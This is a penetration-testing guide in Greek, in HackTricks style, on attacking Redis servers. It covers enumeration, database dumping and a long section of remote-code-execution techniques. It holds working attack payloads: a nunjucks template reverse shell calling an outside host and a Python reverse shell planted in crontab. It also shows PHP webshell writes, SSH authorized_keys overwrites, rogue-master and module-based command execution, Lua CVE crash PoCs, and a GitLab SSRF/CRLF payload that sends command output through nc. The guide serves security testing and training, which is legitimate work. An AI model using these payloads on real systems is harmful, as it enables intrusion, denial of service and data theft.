# 6379 - Pentesting Redis

{{#include ../banners/hacktricks-training.md}}

## Βασικές Πληροφορίες

From [the docs](https://redis.io/topics/introduction): Το Redis είναι λογισμικό ανοιχτού κώδικα (άδεια BSD), μια **αποθήκη δομών δεδομένων** που λειτουργεί στη μνήμη, και χρησιμοποιείται ως **βάση δεδομένων**, cache και διαμεσολαβητής μηνυμάτων).

By default Redis uses a plain-text based protocol, but you have to keep in mind that it can also implement **ssl/tls**. Learn how to [run Redis with ssl/tls here](https://fossies.org/linux/redis/TLS.md).

**Προεπιλεγμένη θύρα:** 6379
```
PORT     STATE SERVICE  VERSION
6379/tcp open  redis   Redis key-value store 4.0.9
```
## Αυτόματος Εντοπισμός

Μερικά αυτοματοποιημένα εργαλεία που μπορούν να βοηθήσουν στην απόκτηση πληροφοριών από ένα redis instance:
```bash
nmap --script redis-info -sV -p 6379 <IP>
msf> use auxiliary/scanner/redis/redis_server
```
## Χειροκίνητη Εξερεύνηση

### Banner

Το Redis είναι ένα **πρωτόκολλο βασισμένο σε κείμενο**, μπορείτε απλά να **στείλετε την εντολή σε ένα socket** και οι επιστρεφόμενες τιμές θα είναι αναγνώσιμες. Επίσης θυμηθείτε ότι Redis μπορεί να τρέξει χρησιμοποιώντας **ssl/tls** (αλλά αυτό είναι πολύ παράξενο).

Σε μια τυπική εγκατάσταση Redis μπορείτε απλά να συνδεθείτε χρησιμοποιώντας `nc` ή μπορείτε επίσης να χρησιμοποιήσετε `redis-cli`:
```bash
nc -vn 10.10.10.10 6379
redis-cli -h 10.10.10.10 # sudo apt-get install redis-tools
```
Η **πρώτη εντολή** που μπορείτε να δοκιμάσετε είναι η **`info`**. Μπορεί να επιστρέψει έξοδο με πληροφορίες για την instance του Redis ή κάτι σαν το παρακάτω:
```
-NOAUTH Authentication required.
```
Σε αυτήν την τελευταία περίπτωση, αυτό σημαίνει ότι **χρειάζεστε valid credentials** για να αποκτήσετε πρόσβαση στο Redis instance.

### Redis Αυθεντικοποίηση

**Από προεπιλογή** το Redis μπορεί να προσπελαστεί **χωρίς credentials**. Ωστόσο, μπορεί να **διαμορφωθεί** ώστε να υποστηρίζει **μόνο password, ή username + password**.\
Είναι δυνατό να **ορίσετε ένα password** στο αρχείο _**redis.conf**_ με την παράμετρο `requirepass` **ή προσωρινά** μέχρι την επανεκκίνηση της υπηρεσίας συνδεόμενοι σε αυτό και εκτελώντας: `config set requirepass p@ss$12E45`.\
Επίσης, ένα **username** μπορεί να ρυθμιστεί στην παράμετρο `masteruser` μέσα στο αρχείο _**redis.conf**_.

> [!TIP]
> Εάν έχει ρυθμιστεί μόνο password, το username που χρησιμοποιείται είναι "**default**".\
> Επίσης, σημειώστε ότι **δεν υπάρχει τρόπος να ανακαλύψετε εξωτερικά** εάν το Redis ρυθμίστηκε μόνο με password ή με username+password.

Σε περιπτώσεις όπως αυτή θα **πρέπει να βρείτε valid credentials** για να αλληλεπιδράσετε με το Redis, οπότε μπορείτε να δοκιμάσετε να το [**brute-force**](../generic-hacking/brute-force.md#redis).\
**Σε περίπτωση που βρείτε valid credentials, πρέπει να αυθεντικοποιήσετε τη συνεδρία** αφού δημιουργήσετε τη σύνδεση με την εντολή:
```bash
AUTH <username> <password>
```
**Έγκυρα διαπιστευτήρια** — η απάντηση θα είναι: `+OK`

### **Καταγραφή με πιστοποίηση**

Εάν ο διακομιστής Redis επιτρέπει **ανώνυμες συνδέσεις** ή αν έχετε αποκτήσει έγκυρα διαπιστευτήρια, μπορείτε να ξεκινήσετε τη διαδικασία καταγραφής για την υπηρεσία χρησιμοποιώντας τις παρακάτω **εντολές**:
```bash
INFO
[ ... Redis response with info ... ]
client list
[ ... Redis response with connected clients ... ]
CONFIG GET *
[ ... Get config ... ]
```
**Άλλες εντολές του Redis** [**μπορούν να βρεθούν εδώ**](https://redis.io/topics/data-types-intro) **και** [**εδώ**](https://lzone.de/cheat-sheet/Redis)**.**

Σημειώστε ότι οι **εντολές του Redis μιας instance μπορούν να μετονομαστούν** ή να αφαιρεθούν στο αρχείο _redis.conf_. Για παράδειγμα αυτή η γραμμή θα αφαιρέσει την εντολή FLUSHDB:
```
rename-command FLUSHDB ""
```
Περισσότερα για το πώς να διαμορφώσετε με ασφάλεια μια υπηρεσία Redis εδώ: [https://www.digitalocean.com/community/tutorials/how-to-install-and-secure-redis-on-ubuntu-18-04](https://www.digitalocean.com/community/tutorials/how-to-install-and-secure-redis-on-ubuntu-18-04)

Επίσης μπορείτε να **παρακολουθείτε σε πραγματικό χρόνο τις εντολές του Redis** που εκτελούνται με την εντολή **`monitor`** ή να πάρετε τις **25 πιο αργές ερωτήσεις** με **`slowlog get 25`**

Βρείτε περισσότερες ενδιαφέρουσες πληροφορίες για εντολές του Redis εδώ: [https://lzone.de/cheat-sheet/Redis](https://lzone.de/cheat-sheet/Redis)

### **Εξαγωγή Βάσης Δεδομένων**

Μέσα στο Redis οι **βάσεις δεδομένων είναι αριθμοί που ξεκινούν από το 0**. Μπορείτε να διαπιστώσετε αν κάποιες χρησιμοποιούνται στην έξοδο της εντολής `info` στο τμήμα "Keyspace":

![](<../images/image (766).png>)

Ή μπορείτε απλά να πάρετε όλα τα **keyspaces** (βάσεις δεδομένων) με:
```
INFO keyspace
```
Σε αυτό το παράδειγμα χρησιμοποιούνται οι **database 0 and 1**. **Database 0 contains 4 keys and database 1 contains 1**. Από προεπιλογή, το Redis θα χρησιμοποιεί τη database 0. Για να κάνετε dump, για παράδειγμα της database 1, πρέπει να κάνετε:
```bash
SELECT 1
[ ... Indicate the database ... ]
KEYS *
[ ... Get Keys ... ]
GET <KEY>
[ ... Get Key ... ]
```
Σε περίπτωση που λάβετε το ακόλουθο σφάλμα `-WRONGTYPE Operation against a key holding the wrong kind of value` κατά την εκτέλεση του `GET <KEY>`, αυτό συμβαίνει επειδή το key μπορεί να είναι κάτι διαφορετικό από string ή integer και απαιτεί ειδική εντολή/χειρισμό για να εμφανιστεί.

Για να μάθετε τον τύπο του key, χρησιμοποιήστε την εντολή `TYPE`. Παράδειγμα παρακάτω για list και hash keys.
```bash
TYPE <KEY>
[ ... Type of the Key ... ]
LRANGE <KEY> 0 -1
[ ... Get list items ... ]
HGET <KEY> <FIELD>
[ ... Get hash item ... ]

# If the type used is weird you can always do:
DUMP <key>
```
**Εξαγωγή της βάσης δεδομένων με npm**[ **redis-dump**](https://www.npmjs.com/package/redis-dump) **ή python** [**redis-utils**](https://pypi.org/project/redis-utils/)

## Redis RCE

### Interactive Shell

[**redis-rogue-server**](https://github.com/n0b0dyCN/redis-rogue-server) μπορεί αυτόματα να αποκτήσει ένα interactive shell ή ένα reverse shell στο Redis(<=5.0.5).
```
./redis-rogue-server.py --rhost <TARGET_IP> --lhost <ACCACKER_IP>
```
### PHP Webshell

Πληροφορίες από [**here**](https://web.archive.org/web/20191201022931/http://reverse-tcp.xyz/pentest/database/2017/02/09/Redis-Hacking-Tips.html). Πρέπει να γνωρίζεις το **path** του **φακέλου του ιστότοπου**:
```
root@Urahara:~# redis-cli -h 10.85.0.52
10.85.0.52:6379> config set dir /usr/share/nginx/html
OK
10.85.0.52:6379> config set dbfilename redis.php
OK
10.85.0.52:6379> set test "<?php phpinfo(); ?>"
OK
10.85.0.52:6379> save
OK
```
Εάν η πρόσβαση μέσω webshell αποτύχει, μπορείς να αδειάσεις τη βάση δεδομένων αφού πάρεις εφεδρικό αντίγραφο και να προσπαθήσεις ξανά — θυμήσου να επαναφέρεις τη βάση δεδομένων.

### Πρότυπο Webshell

Όπως στην προηγούμενη ενότητα, μπορείς επίσης να αντικαταστήσεις κάποιο αρχείο προτύπου html που θα ερμηνευτεί από έναν template engine και να αποκτήσεις shell.

Για παράδειγμα, ακολουθώντας [**this writeup**](https://www.neteye-blog.com/2022/05/cyber-apocalypse-ctf-2022-red-island-writeup/), μπορείς να δεις ότι ο επιτιθέμενος έγχυσε ένα **rev shell in an html** που ερμηνεύεται από τον **nunjucks template engine:**
```javascript
{{ ({}).constructor.constructor(
"var net = global.process.mainModule.require('net'),
cp = global.process.mainModule.require('child_process'),
sh = cp.spawn('sh', []);
var client = new net.Socket();
client.connect(1234, 'my-server.com', function(){
client.pipe(sh.stdin);
sh.stdout.pipe(client);
sh.stderr.pipe(client);
});"
)()}}
```
> [!WARNING]
> Λάβετε υπόψη ότι **several template engines cache** τα templates στη **μνήμη**, οπότε ακόμη και αν τα υπεργράψετε, το νέο **δεν θα εκτελεστεί**. Σε αυτές τις περιπτώσεις, είτε ο developer άφησε ενεργοποιημένο το automatic reload είτε χρειάζεται να κάνετε DoS στην υπηρεσία (και να αναμένετε ότι θα επανεκκινηθεί αυτόματα).

### SSH

Παράδειγμα [from here](https://blog.adithyanak.com/oscp-preparation-guide/enumeration)

Παρακαλώ σημειώστε ότι το αποτέλεσμα του **`config get dir`** μπορεί να αλλάξει μετά από άλλες χειροκίνητες exploit εντολές. Συνιστάται να το τρέξετε πρώτο αμέσως μετά το login στο Redis. Στην έξοδο του **`config get dir`** μπορεί να βρείτε το home του **redis user** (συνήθως _/var/lib/redis_ ή _/home/redis/.ssh_), και γνωρίζοντας αυτό ξέρετε πού μπορείτε να γράψετε το αρχείο `authenticated_users` για πρόσβαση μέσω ssh **ως χρήστης redis**. Αν γνωρίζετε το home άλλου έγκυρου χρήστη όπου έχετε δικαιώματα εγγραφής, μπορείτε επίσης να το εκμεταλλευτείτε:

1. Δημιουργήστε ένα ssh δημόσιο-ιδιωτικό ζεύγος κλειδιών στον υπολογιστή σας: **`ssh-keygen -t rsa`**
2. Γράψτε το public key σε ένα αρχείο : **`(echo -e "\n\n"; cat ~/id_rsa.pub; echo -e "\n\n") > spaced_key.txt`**
3. Εισάγετε το αρχείο στο redis : **`cat spaced_key.txt | redis-cli -h 10.85.0.52 -x set ssh_key`**
4. Αποθηκεύστε το public key στο αρχείο **authorized_keys** στον redis server:

```
root@Urahara:~# redis-cli -h 10.85.0.52
10.85.0.52:6379> config set dir /var/lib/redis/.ssh
OK
10.85.0.52:6379> config set dbfilename "authorized_keys"
OK
10.85.0.52:6379> save
OK
```

5. Τέλος, μπορείτε να κάνετε **ssh** στον **redis server** με το ιδιωτικό κλειδί : **ssh -i id_rsa redis@10.85.0.52**

**This technique is automated here:** [https://github.com/Avinash-acid/Redis-Server-Exploit](https://github.com/Avinash-acid/Redis-Server-Exploit)

Επιπλέον, οι system users μπορούν να εντοπιστούν ελέγχοντας με `config set dir /home/USER`, και μετά από επιβεβαίωση, ένα νέο `authorized_keys` μπορεί να γραφτεί στο `/home/USER/.ssh/authorized_keys`. Χρησιμοποιήστε [redis-rce-ssh](https://github.com/captain-woof/redis-rce-ssh) για να κάνετε bruteforce αυτό με μια wordlist ονομάτων χρηστών και να αντικαταστήσετε το `authorized_keys`.

### Crontab
```
root@Urahara:~# echo -e "\n\n*/1 * * * * /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.85.0.53\",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n\n"|redis-cli -h 10.85.0.52 -x set 1
OK
root@Urahara:~# redis-cli -h 10.85.0.52 config set dir /var/spool/cron/crontabs/
OK
root@Urahara:~# redis-cli -h 10.85.0.52 config set dbfilename root
OK
root@Urahara:~# redis-cli -h 10.85.0.52 save
OK
```
Το τελευταίο παράδειγμα είναι για Ubuntu, για **Centos**, η παραπάνω εντολή πρέπει να είναι: `redis-cli -h 10.85.0.52 config set dir /var/spool/cron/`

Αυτή η μέθοδος μπορεί επίσης να χρησιμοποιηθεί για να κερδίσετε bitcoin ：[yam](https://www.v2ex.com/t/286981#reply14)

### Φόρτωση module του Redis

1. Ακολουθώντας τις οδηγίες από [https://github.com/n0b0dyCN/RedisModules-ExecuteCommand](https://github.com/n0b0dyCN/RedisModules-ExecuteCommand) μπορείτε να **μεταγλωττίσετε ένα redis module για να εκτελέσετε αυθαίρετες εντολές**.
2. Στη συνέχεια χρειάζεστε κάποιον τρόπο να **ανεβάσετε το μεταγλωττισμένο** module
3. **Φορτώστε το ανεβασμένο module** κατά την εκτέλεση με `MODULE LOAD /path/to/mymodule.so`
4. **Δείτε τα φορτωμένα modules** για να ελέγξετε ότι φορτώθηκε σωστά: `MODULE LIST`
5. **Εκτέλεση** **εντολών**:

```
127.0.0.1:6379> system.exec "id"
"uid=0(root) gid=0(root) groups=0(root)\n"
127.0.0.1:6379> system.exec "whoami"
"root\n"
127.0.0.1:6379> system.rev 127.0.0.1 9999
```

6. Αποφορτώστε το module όποτε θέλετε: `MODULE UNLOAD mymodule`

### Παράκαμψη του sandbox του LUA

[**Here**](https://www.agarri.fr/blog/archives/2014/09/11/trying_to_hack_redis_via_http_requests/index.html) μπορείτε να δείτε ότι το Redis χρησιμοποιεί την εντολή **EVAL** για να εκτελέσει **Lua code sandboxed**. Στην αναφερόμενη ανάρτηση μπορείτε να δείτε **πώς να το καταχραστείτε** χρησιμοποιώντας τη συνάρτηση **dofile**, αλλά [apparently](https://stackoverflow.com/questions/43502696/redis-cli-code-execution-using-eval) αυτό δεν είναι πλέον δυνατό. Σε κάθε περίπτωση, αν μπορείτε να **παρακάμψετε το Lua** sandbox θα μπορούσατε να **εκτελέσετε αυθαίρετες** εντολές στο σύστημα. Επίσης, από την ίδια ανάρτηση μπορείτε να δείτε μερικές **επιλογές για να προκαλέσετε DoS**.

Some **CVEs to escape from LUA**:

- [https://github.com/aodsec/CVE-2022-0543](https://github.com/aodsec/CVE-2022-0543)

#### Redis Lua Scripting Engine: Sandbox Escapes & Memory Corruption (CVE-2025-49844/46817/46818)

Πρόσφατες εκδόσεις του Redis διόρθωσαν πολλαπλά θέματα στη ενσωματωμένη μηχανή Lua που επιτρέπουν απόδραση από το sandbox, διαφθορά μνήμης και εκτέλεση κώδικα μεταξύ χρηστών. Αυτές οι τεχνικές εφαρμόζονται όταν:
- Ο επιτιθέμενος μπορεί να αυθεντικοποιηθεί στο Redis και το Lua είναι ενεργοποιημένο (EVAL/EVALSHA ή FUNCTION είναι διαθέσιμα)
- Η έκδοση του Redis είναι παλαιότερη από 8.2.2, 8.0.4, 7.4.6, 7.2.11, ή 6.2.20

Tip: If you are new to Lua sandboxing tricks, check this page for general techniques:

{{#ref}}
../generic-methodologies-and-resources/lua/bypass-lua-sandboxes/README.md
{{#endref}}

**Patch-level context:**
- Fixed in: 8.2.2, 8.0.4, 7.4.6, 7.2.11, 6.2.20
- Affected when Lua scripting is enabled and the above versions are not applied

**CVE-2025-49844 — GC-timed Use-After-Free in Lua parser (`lparser.c: luaY_parser`)**
- Idea: Προκαλέστε garbage collection (GC) ενώ ο parser εξακολουθεί να αναφέρεται σε ένα πρόσφατα εισαχθέν TString. Όταν το GC το ανακτήσει, ο parser χρησιμοποιεί pointer που έχει ελευθερωθεί (UAF) → crash/DoS και πιθανή εκτέλεση native κώδικα έξω από το Lua sandbox.
- Trigger strategy:
1) Δημιουργήστε πίεση μνήμης με τεράστιες συμβολοσειρές για να ενθαρρύνετε τη δραστηριότητα του GC
2) Εκτελέστε ρητά το GC ενώ ένα μεγάλο κομμάτι πηγαίου κώδικα συντάσσεται
3) Μεταγλωττίστε ένα πολύ μεγάλο Lua script σε βρόχο μέχρι το GC να ευθυγραμμιστεί με την ανάλυση (parsing)

Minimal EVAL harness to reproduce crashes
```bash
# Auth as needed (-a/--user), then run EVAL with 0 keys
redis-cli -h <host> -p 6379 -a <password> EVAL "\
local a = string.rep('asdf', 65536); \
collectgarbage('collect'); \
local src = string.rep('x', 1024 * 1024); \
local f = loadstring(src); \
return 'done'" 0
```
Σημειώσεις:
- Μπορεί να χρειαστούν πολλαπλές προσπάθειες για να ευθυγραμμιστεί ο GC με luaY_parser. Ένα crash υποδηλώνει ότι ο UAF χτυπήθηκε.
- Από το exploitation στο RCE απαιτείται memory grooming και native code pivoting πέρα από το Redis Lua sandbox.

**CVE-2025-46817 — Integer overflow in unpack (`lbaselib.c: luaB_unpack`)**
- Root cause: Η τιμή `n = e - i + 1` υπολογίζεται χωρίς unsigned casts, έτσι extreme indices wrap, κάνοντας τη Lua να προσπαθεί να unpack πολύ περισσότερα στοιχεία από όσα υπάρχουν → stack corruption and memory exhaustion.
- PoC (DoS/mem exhaustion):
```bash
redis-cli -h <host> -p 6379 -a <password> EVAL "return unpack({'a','b','c'}, -1, 2147483647)" 0
```
- Αναμένετε ο server να προσπαθήσει να επιστρέψει τεράστιο αριθμό τιμών και τελικά να καταρρεύσει ή να φτάσει σε OOM.

**CVE-2025-46818 — Cross-user privilege escalation via basic type metatables**
- Root cause: Κατά την engine initialization, τα metatables για βασικούς τύπους (π.χ. strings, booleans) δεν ορίστηκαν ως read-only. Οποιοσδήποτε authenticated user μπορεί να τα μολύνει ώστε να εισαγάγει methods που άλλοι χρήστες μπορεί να καλέσουν αργότερα.
- Παράδειγμα (string metatable poisoning):
```bash
# Inject a method on strings and then exercise it
redis-cli -h <host> -p 6379 -a <password> EVAL "\
getmetatable('').__index = function(_, key) \
if key == 'testfunc' then \
return function() return 'testfuncoutput' end \
end \
end; \
return ('teststring').testfunc()" 0
# → Returns: testfuncoutput
```
- Impact: Εκτέλεση κώδικα μεταξύ χρηστών μέσα στο Lua sandbox χρησιμοποιώντας τα δικαιώματα Redis του θύματος. Χρήσιμο για lateral movement/priv-esc εντός πλαισίων Redis ACL.

### Μονάδα Master-Slave

Οι λειτουργίες του master redis συγχρονίζονται αυτόματα στο slave redis, πράγμα που σημαίνει ότι μπορούμε να θεωρήσουμε το ευάλωτο redis ως slave redis, συνδεδεμένο με το master redis που ελέγχουμε, και στη συνέχεια να στείλουμε εντολές στο δικό μας redis.
```
master redis : 10.85.0.51 (Hacker's Server)
slave  redis : 10.85.0.52 (Target Vulnerability Server)
A master-slave connection will be established from the slave redis and the master redis:
redis-cli -h 10.85.0.52 -p 6379
slaveof 10.85.0.51 6379
Then you can login to the master redis to control the slave redis:
redis-cli -h 10.85.0.51 -p 6379
set mykey hello
set mykey2 helloworld
```
## SSRF talking to Redis

Αν μπορείς να στείλεις **clear text** αίτημα **προς Redis**, μπορείς να **επικοινωνήσεις μαζί του**, καθώς το Redis θα διαβάζει το αίτημα γραμμή-γραμμή και απλώς θα απαντά με σφάλματα στις γραμμές που δεν καταλαβαίνει:
```
-ERR wrong number of arguments for 'get' command
-ERR unknown command 'Host:'
-ERR unknown command 'Accept:'
-ERR unknown command 'Accept-Encoding:'
-ERR unknown command 'Via:'
-ERR unknown command 'Cache-Control:'
-ERR unknown command 'Connection:'
```
Επομένως, αν βρείτε ένα **SSRF vuln** σε έναν ιστότοπο και μπορείτε να **control** μερικά **headers** (ίσως με ένα CRLF vuln) ή **POST parameters**, θα μπορέσετε να στείλετε αυθαίρετες εντολές στο Redis.

### Example: Gitlab SSRF + CRLF to Shell

Σε **Gitlab11.4.7** ανακαλύφθηκαν μια ευπάθεια **SSRF** και ένα **CRLF**. Η ευπάθεια **SSRF** βρισκόταν στη **import project from URL functionality** κατά τη δημιουργία νέου project και επέτρεπε πρόσβαση σε αυθαίρετες IP με τη μορφή \[0:0:0:0:0:ffff:127.0.0.1] (αυτό θα προσπελάσει το 127.0.0.1), και το **CRLF** vuln εκμεταλλεύτηκε απλά με **προσθήκη χαρακτήρων %0D%0A** στο **URL**.

Επομένως, ήταν δυνατό να **abuse these vulnerabilities to talk to the Redis instance** που **manages queues** από το **gitlab** και να εκμεταλλευτούν αυτές τις ουρές για να **obtain code execution**. Το Redis queue abuse payload είναι:
```
multi
sadd resque:gitlab:queues system_hook_push
lpush resque:gitlab:queue:system_hook_push "{\"class\":\"GitlabShellWorker\",\"args\":[\"class_eval\",\"open(\'|whoami | nc 192.241.233.143 80\').read\"],\"retry\":3,\"queue\":\"system_hook_push\",\"jid\":\"ad52abc5641173e217eb2e52\",\"created_at\":1513714403.8122594,\"enqueued_at\":1513714403.8129568}"
exec
```
Και το αίτημα **URL encode** που χρησιμοποιεί **abusing SSRF** και **CRLF** για να εκτελέσει το `whoami` και να στείλει την έξοδο πίσω μέσω του `nc` είναι:
```
git://[0:0:0:0:0:ffff:127.0.0.1]:6379/%0D%0A%20multi%0D%0A%20sadd%20resque%3Agitlab%3Aqueues%20system%5Fhook%5Fpush%0D%0A%20lpush%20resque%3Agitlab%3Aqueue%3Asystem%5Fhook%5Fpush%20%22%7B%5C%22class%5C%22%3A%5C%22GitlabShellWorker%5C%22%2C%5C%22args%5C%22%3A%5B%5C%22class%5Feval%5C%22%2C%5C%22open%28%5C%27%7Ccat%20%2Fflag%20%7C%20nc%20127%2E0%2E0%2E1%202222%5C%27%29%2Eread%5C%22%5D%2C%5C%22retry%5C%22%3A3%2C%5C%22queue%5C%22%3A%5C%22system%5Fhook%5Fpush%5C%22%2C%5C%22jid%5C%22%3A%5C%22ad52abc5641173e217eb2e52%5C%22%2C%5C%22created%5Fat%5C%22%3A1513714403%2E8122594%2C%5C%22enqueued%5Fat%5C%22%3A1513714403%2E8129568%7D%22%0D%0A%20exec%0D%0A%20exec%0D%0A/ssrf123321.git
```
_Για κάποιο λόγο (όπως και ο συγγραφέας του_ [_https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/_](https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/) _από όπου ελήφθη αυτή η πληροφορία) η εκμετάλλευση δούλεψε με το `git` σχήμα και όχι με το `http` σχήμα._

## Αναφορές

- [Recent Vulnerabilities in Redis Server’s Lua Scripting Engine (OffSec)](https://www.offsec.com/blog/recent-vulnerabilities-in-redis-servers-lua-scripting-engine/)
- [NVD: CVE-2025-49844](https://nvd.nist.gov/vuln/detail/CVE-2025-49844)
- [NVD: CVE-2025-46817](https://nvd.nist.gov/vuln/detail/CVE-2025-46817)
- [NVD: CVE-2025-46818](https://nvd.nist.gov/vuln/detail/CVE-2025-46818)
- [Wiz analysis of Redis RCE (CVE-2025-49844)](https://www.wiz.io/blog/wiz-research-redis-rce-cve-2025-49844)
- [PoC: CVE-2025-49844 — Lua parser UAF](https://github.com/dwisiswant0/CVE-2025-49844)
- [PoC: CVE-2025-46817 — unpack integer overflow](https://github.com/dwisiswant0/CVE-2025-46817)
- [PoC: CVE-2025-46818 — basic-type metatable abuse](https://github.com/dwisiswant0/CVE-2025-46818)

{{#include ../banners/hacktricks-training.md}}
